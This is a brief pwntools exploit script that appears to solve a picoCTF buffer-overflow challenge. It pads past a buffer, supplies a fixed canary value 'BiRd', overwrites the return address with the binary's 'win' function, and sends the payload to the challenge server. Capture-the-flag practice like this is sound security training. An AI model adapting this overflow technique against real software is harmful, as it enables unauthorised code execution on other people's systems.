import pwn

elf = pwn.ELF("./vuln")

winadd = pwn.p32(elf.symbols["win"])

offset = 64

#p = elf.process()
p = pwn.remote("saturn.picoctf.net", 63437)
payload = b"".join(
  [
    b"A"*offset,
    b"BiRd",
    b"A"*16,
    winadd,
  ]
)
payload += b"\n"
#print(p.recv().decode('utf8'))
p.sendlineafter(b'> ',str(len(payload)))
p.sendafter(b'> ',payload)
p.recvuntil(b'?')
p.interactive()
